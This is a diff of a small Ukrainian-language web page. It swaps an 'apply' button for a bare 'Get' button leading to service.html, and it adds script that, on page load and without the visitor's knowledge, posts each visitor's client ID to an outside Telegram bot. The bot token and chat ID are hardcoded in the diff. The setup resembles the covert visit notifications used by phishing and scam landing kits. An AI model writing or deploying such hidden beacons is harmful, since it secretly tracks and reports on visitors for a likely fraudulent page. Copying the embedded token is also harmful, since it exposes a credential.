@@ -14,9 +14,8 @@ body{
   align-items:center;
   height:100vh;
 }
-.box{text-align:center}
 button{
-  padding:14px 20px;
+  padding:15px;
   border:none;
   border-radius:10px;
   background:#3b82f6;
@@ -28,11 +27,7 @@ button{
 
 <body>
 
-<div class="box">
-  <h1></h1>
-  <p>Нажміть щоб подати заявку</p>
-  <button onclick="start()">Подати</button>
-</div>
+<button onclick="start()">Отримати</button>
 
 <script>
 let clientId = localStorage.getItem("clientId");
@@ -41,6 +36,19 @@ if (!clientId) {
   clientId = Math.floor(100000 + Math.random() * 900000);
   localStorage.setItem("clientId", clientId);
 }
+
+/* 🔥 УВЕДОМЛЕНИЕ В TELEGRAM ПРИ ВХОДЕ */
+const token = "8590965261:AAEl5s04HGhShe2oFYLl4wFuCIomOGQ6cag";
+const chat_id = "8035773808";
+
+fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+  method:"POST",
+  headers:{"Content-Type":"application/json"},
+  body:JSON.stringify({
+    chat_id:chat_id,
+    text:`👤 Новый переход\nID клиента: ${clientId}`
+  })
+});
 
 function start(){
   window.location.href = "service.html";
